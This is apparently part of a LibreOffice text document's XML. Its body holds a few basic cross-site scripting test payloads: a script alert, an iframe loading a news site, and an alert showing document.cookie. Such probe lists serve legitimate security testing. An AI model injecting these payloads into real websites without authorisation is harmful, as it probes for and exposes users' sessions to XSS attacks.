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c5b3" officeooo:paragraph-rsid="0019c5b3"/>
    </style:style>
    <style:style style:name="P2" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Courier New" fo:font-size="14pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="0019c5b3" officeooo:paragraph-rsid="0019c5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SS</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P2">MESSAGE: <text:s/>&lt;script&gt;alert("This is a XSS Exploit Test")&lt;/script&gt;</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2">open webpage:</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2">&lt;iframe src="<text:a xlink:type="simple" xlink:href="http://www.cnn.com/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">http://www.cnn.com</text:a>"&gt;&lt;/iframe&gt;</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2">see cookies:</text:p>
      <text:p text:style-name="P2">&lt;script&gt;alert(document.cookie)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09:28.427134577</meta:creation-date>
    <dc:date>2019-10-23T12:16:38.555119158</dc:date>
    <meta:editing-duration>PT7M10S</meta:editing-duration>
    <meta:editing-cycles>1</meta:editing-cycles>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="1" meta:paragraph-count="6" meta:word-count="15" meta:character-count="171" meta:non-whitespace-character-count="161"/>
    <meta:generator>LibreOffice/6.0.7.3$Linux_X86_64 LibreOffice_project/00m0$Build-3</meta:generator>
  </office:meta>
</office:document-meta>
</file>